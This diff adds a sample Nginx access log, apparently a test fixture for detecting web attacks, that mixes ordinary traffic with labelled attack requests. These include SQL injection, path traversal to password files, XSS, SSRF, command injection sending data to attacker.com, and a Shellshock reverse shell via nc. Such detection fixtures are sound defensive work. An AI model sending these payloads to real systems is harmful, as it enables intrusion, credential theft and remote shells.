@@ -1,0 +1,101 @@
+# Sample Nginx Access Logs with Web Attack Patterns
+# This file contains realistic examples of web attacks for testing Wildbox log ingestion
+
+# Normal legitimate traffic
+192.168.1.50 - - [09/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.50 - - [09/Nov/2025:10:00:02 +0000] "GET /css/style.css HTTP/1.1" 200 5678 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.51 - - [09/Nov/2025:10:00:03 +0000] "GET /about HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+192.168.1.52 - - [09/Nov/2025:10:00:04 +0000] "POST /contact HTTP/1.1" 200 456 "http://example.com/contact" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+
+# SQL Injection Attempts - Classic patterns
+10.0.0.100 - - [09/Nov/2025:10:05:01 +0000] "GET /products?id=1' OR '1'='1 HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
+10.0.0.100 - - [09/Nov/2025:10:05:02 +0000] "GET /user?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
+10.0.0.100 - - [09/Nov/2025:10:05:03 +0000] "GET /search?q='; DROP TABLE products;-- HTTP/1.1" 500 1234 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
+10.0.0.100 - - [09/Nov/2025:10:05:04 +0000] "POST /login HTTP/1.1" 401 234 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
+
+# Path Traversal Attempts
+10.0.0.101 - - [09/Nov/2025:10:10:01 +0000] "GET /../../../etc/passwd HTTP/1.1" 404 162 "-" "curl/7.68.0"
+10.0.0.101 - - [09/Nov/2025:10:10:02 +0000] "GET /download?file=../../../../etc/shadow HTTP/1.1" 403 162 "-" "curl/7.68.0"
+10.0.0.101 - - [09/Nov/2025:10:10:03 +0000] "GET /files/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 162 "-" "curl/7.68.0"
+10.0.0.101 - - [09/Nov/2025:10:10:04 +0000] "GET /images/../../../windows/system32/config/sam HTTP/1.1" 404 162 "-" "curl/7.68.0"
+
+# Cross-Site Scripting (XSS) Attempts
+10.0.0.102 - - [09/Nov/2025:10:15:01 +0000] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
+10.0.0.102 - - [09/Nov/2025:10:15:02 +0000] "GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
+10.0.0.102 - - [09/Nov/2025:10:15:03 +0000] "GET /profile?name=<iframe src=javascript:alert('XSS')> HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
+10.0.0.102 - - [09/Nov/2025:10:15:04 +0000] "POST /post HTTP/1.1" 200 456 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
+
+# Brute Force Login Attempts - Multiple failed attempts from same IP
+10.0.0.103 - - [09/Nov/2025:10:20:01 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:02 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:03 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:04 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:05 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:06 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:07 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:08 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:09 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+10.0.0.103 - - [09/Nov/2025:10:20:10 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
+
+# Security Scanner Activity - Recognizable User-Agents
+10.0.0.104 - - [09/Nov/2025:10:25:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "sqlmap/1.7.2#stable (http://sqlmap.org)"
+10.0.0.104 - - [09/Nov/2025:10:25:02 +0000] "GET /admin HTTP/1.1" 404 162 "-" "sqlmap/1.7.2#stable (http://sqlmap.org)"
+10.0.0.105 - - [09/Nov/2025:10:25:03 +0000] "GET / HTTP/1.1" 200 1234 "-" "Nikto/2.1.6"
+10.0.0.105 - - [09/Nov/2025:10:25:04 +0000] "GET /cgi-bin/ HTTP/1.1" 404 162 "-" "Nikto/2.1.6"
+10.0.0.106 - - [09/Nov/2025:10:25:05 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+10.0.0.107 - - [09/Nov/2025:10:25:06 +0000] "GET /admin HTTP/1.1" 404 162 "-" "Acunetix Web Vulnerability Scanner"
+10.0.0.108 - - [09/Nov/2025:10:25:07 +0000] "GET / HTTP/1.1" 200 1234 "-" "ZmEu"
+10.0.0.109 - - [09/Nov/2025:10:25:08 +0000] "GET /phpMyAdmin HTTP/1.1" 404 162 "-" "WPScan v3.8.22"
+
+# Command Injection Attempts
+10.0.0.110 - - [09/Nov/2025:10:30:01 +0000] "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 500 234 "-" "curl/7.68.0"
+10.0.0.110 - - [09/Nov/2025:10:30:02 +0000] "GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1" 500 234 "-" "curl/7.68.0"
+10.0.0.110 - - [09/Nov/2025:10:30:03 +0000] "GET /run?command=`wget http://evil.com/shell.sh` HTTP/1.1" 500 234 "-" "curl/7.68.0"
+
+# Local File Inclusion (LFI) Attempts
+10.0.0.111 - - [09/Nov/2025:10:35:01 +0000] "GET /page?file=/etc/passwd HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+10.0.0.111 - - [09/Nov/2025:10:35:02 +0000] "GET /index.php?page=php://filter/convert.base64-encode/resource=index HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+10.0.0.111 - - [09/Nov/2025:10:35:03 +0000] "GET /view?file=../../../../../../etc/passwd%00 HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+
+# Remote File Inclusion (RFI) Attempts
+10.0.0.112 - - [09/Nov/2025:10:40:01 +0000] "GET /page?file=http://evil.com/shell.txt HTTP/1.1" 403 162 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36"
+10.0.0.112 - - [09/Nov/2025:10:40:02 +0000] "GET /include?url=http://attacker.com/malware.php HTTP/1.1" 403 162 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36"
+
+# XML External Entity (XXE) Injection - Visible in POST requests
+10.0.0.113 - - [09/Nov/2025:10:45:01 +0000] "POST /api/xml HTTP/1.1" 500 234 "-" "python-requests/2.28.0"
+10.0.0.113 - - [09/Nov/2025:10:45:02 +0000] "POST /upload/xml HTTP/1.1" 500 234 "-" "python-requests/2.28.0"
+
+# Server-Side Request Forgery (SSRF) Attempts
+10.0.0.114 - - [09/Nov/2025:10:50:01 +0000] "GET /proxy?url=http://localhost/admin HTTP/1.1" 403 162 "-" "curl/7.68.0"
+10.0.0.114 - - [09/Nov/2025:10:50:02 +0000] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 162 "-" "curl/7.68.0"
+10.0.0.114 - - [09/Nov/2025:10:50:03 +0000] "GET /image?src=http://internal-server:8080/secrets HTTP/1.1" 403 162 "-" "curl/7.68.0"
+
+# Rate Limiting Violations - Rapid requests from single IP
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 429 234 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 429 234 "-" "python-requests/2.28.0"
+10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 429 234 "-" "python-requests/2.28.0"
+
+# WordPress/CMS Specific Attacks
+10.0.0.116 - - [09/Nov/2025:11:00:01 +0000] "GET /wp-admin/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; WPScan)"
+10.0.0.116 - - [09/Nov/2025:11:00:02 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; WPScan)"
+10.0.0.116 - - [09/Nov/2025:11:00:03 +0000] "GET /xmlrpc.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; WPScan)"
+10.0.0.116 - - [09/Nov/2025:11:00:04 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; WPScan)"
+
+# Mixed with more legitimate traffic
+192.168.1.53 - - [09/Nov/2025:11:05:01 +0000] "GET /products HTTP/1.1" 200 4567 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+192.168.1.53 - - [09/Nov/2025:11:05:02 +0000] "GET /products/123 HTTP/1.1" 200 2345 "http://example.com/products" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
+192.168.1.54 - - [09/Nov/2025:11:05:03 +0000] "POST /api/cart HTTP/1.1" 201 123 "-" "Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36"
+192.168.1.55 - - [09/Nov/2025:11:05:04 +0000] "GET /checkout HTTP/1.1" 200 3456 "http://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
+
+# LDAP Injection Attempts
+10.0.0.117 - - [09/Nov/2025:11:10:01 +0000] "GET /search?user=*)(uid=*))(&(uid=* HTTP/1.1" 500 234 "-" "curl/7.68.0"
+10.0.0.117 - - [09/Nov/2025:11:10:02 +0000] "GET /login?username=admin)(&(password=*)) HTTP/1.1" 401 234 "-" "curl/7.68.0"
+
+# Shell Shock Attempts
+10.0.0.118 - - [09/Nov/2025:11:15:01 +0000] "GET /cgi-bin/test HTTP/1.1" 404 162 "() { :; }; echo; /bin/cat /etc/passwd" "curl/7.68.0"
+10.0.0.118 - - [09/Nov/2025:11:15:02 +0000] "GET /cgi-bin/status HTTP/1.1" 404 162 "() { :; }; /bin/bash -c 'nc -e /bin/sh attacker.com 4444'" "curl/7.68.0"
